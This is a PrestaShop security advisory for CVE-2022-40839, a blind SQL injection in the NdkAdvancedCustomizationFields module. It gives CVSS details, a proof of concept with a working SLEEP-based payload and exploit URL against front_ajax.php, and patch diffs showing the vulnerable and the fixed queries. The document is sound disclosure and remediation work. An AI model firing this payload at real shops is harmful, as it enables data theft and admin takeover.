---
layout: post
title: "[CVE-2022-40839] Improper neutralization of SQL parameter in NdkAdvancedCustomizationFields module for PrestaShop"
categories: module
author:
- Friends-Of-Presta.org
meta: "CVE,PrestaShop,ndk_advanced_custom_fields"
severity: "critical (9.8)"
---

In NdkAdvancedCustomizationFields module for PrestaShop before 4.1.7, an anonymous user can perform a SQL injection in affected versions. 4.1.7 fixed the vulnerability.

## Summary

* **CVE ID**: [CVE-2022-40839](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-40839)
* **Published at**: 2022-11-01
* **Advisory source**: [@daaaalllii](https://github.com/daaaalllii/cve-s/blob/main/CVE-2022-40839/poc.txt)
* **Platform**: PrestaShop
* **Product**: ndk_advanced_custom_fields
* **Impacted release**: <= 4.1.6 (4.1.7 fixed the vulnerability)
* **Product author**: ndk design
* **Weakness**: [CWE-89](https://cwe.mitre.org/data/definitions/89.html)
* **Severity**: critical (9.8)

## Description

In the NdkAdvancedCustomizationFields module for PrestaShop up to version 4.1.6, a sensitive SQL call in the NdkCf class can be executed via a trivial HTTP call. This vulnerability can be exploited to initiate a blind SQL injection, for instance, through the POST or GET submitted `height` and `width` variables.


## CVSS base metrics

* **Attack vector**: network
* **Attack complexity**: low
* **Privilege required**: none
* **User interaction**: none
* **Scope**: unchanged
* **Confidentiality**: high
* **Integrity**: high
* **Availability**: high

**Vector string**: [CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

## Possible malicious usage

* Obtain admin access
* Remove data from the associated PrestaShop
* Copy/paste data from sensitive tables to FRONT to expose tokens and unlock admins's ajax scripts
* Rewrite SMTP settings to hijack emails

## Proof of concept

Parameters: height,width

Payload: 1' AND (SELECT 6330 FROM (SELECT(SLEEP(5)))pQfS) AND 'dpZV'='dpZV

Exploit:
```
http://localhost/modules/ndk_advanced_custom_fields/front_ajax.php?action=getRangePrice&group=19&width=1' AND (SELECT 6330 FROM (SELECT(SLEEP(5)))pQfS) AND 'dpZV'='dpZV&height=1
```


## Patch

Prestashop provide a built in function for sanitising strings to be used in SQL queries called pSQL. This is the quick fix in situations like this but one must be sure to surround the parameter with quotes or the query will still be vulnerable to SQLi

For the function getDimensionPrice, the two problematics parameters, width and height were put in pSQL functions to be sanitised as shown :

```diff
--- a/models/ndkCf.php
+++ b/models/ndkCf.php
@@ -698,589 +1369,1100 @@ class NdkCf extends ObjectModel

	public static function getDimensionPrice($field, $width, $height)
	{
...
 			//on cherche la valeur exacte
 			$result = Db::getInstance(_PS_USE_SQL_SLAVE_)->getRow(
				'SELECT price FROM '._DB_PREFIX_.'ndk_customization_field_csv
						WHERE id_ndk_customization_field = '.(int)$field->id.'
-						AND width = \''.$width.'\' AND height = \''.$height.'\'');
+						AND width = \''.pSQL($width).'\' AND height = \''.pSQL($height).'\'');
 			$item_price = str_replace(',', '.', $result['price']);

 			return $item_price;
		}
  	else
		{
 		$sql = 'SELECT price FROM '._DB_PREFIX_.'ndk_customization_field_csv
					WHERE id_ndk_customization_field = '.(int)$field->id.'
-					ORDER BY ABS(width-'.$width.') ASC, ABS(height-'.$height.') ASC LIMIT 1';
+			    AND width >= '.(float)$width.' AND height >= '.(float)$height.' LIMIT 1';
 			$result = Db::getInstance(_PS_USE_SQL_SLAVE_)->executeS($sql);
			if($result)
```

But the function getRangePrice is still the same as the function wasn't used :

```diff
--- a/models/ndkCf.php
+++ b/models/ndkCf.php
@@ -698,589 +1369,1100 @@ class NdkCf extends ObjectModel

 	public static function getRangePrice($field, $width, $height)
 	{
 		$results = Db::getInstance(_PS_USE_SQL_SLAVE_)->executeS(
			'SELECT * FROM '._DB_PREFIX_.'ndk_customization_field_csv
				WHERE id_ndk_customization_field = '.(int)$field->id.'
-				AND width >= '.$width.' AND height >= '.$height.'
-				ORDER BY width ASC');
+				AND width >= '.(float)$width.' AND height >= '.(float)$height.'
+				ORDER BY width ASC');

```


## Other recommendations

* It’s **highly recommended to upgrade the module** to the latest version or to **delete** the module if unused.
* Upgrade PrestaShop to the latest version to disable multiquery execution (separated by “;”) - be warned that this functionality **WILL NOT** protect your SHOP against injection SQL which uses the UNION clause to steal data.
* Change the default database prefix `ps_` by a new longer arbitrary prefix. Nevertheless, be warned that this is useless against blackhats with DBA senior skills because of a design vulnerability in DBMS
* Activate OWASP 942's rules on your WAF (Web application firewall), be warned that you will probably break your backoffice and you will need to pre-configure some bypasses against these set of rules.

## Timeline

| Date | Action |
| -- | -- |
| 01-11-2022 | GitHub Poc |
| 26-07-2023 | Publish this advisory on [security](https://security.friendsofpresta.org/) |

## Links

* [Source of this CVE](https://github.com/daaaalllii/cve-s/blob/main/CVE-2022-40839/poc.txt)
* [National Vulnerability Database CVE-2022-40839](https://nvd.nist.gov/vuln/detail/CVE-2022-40839)
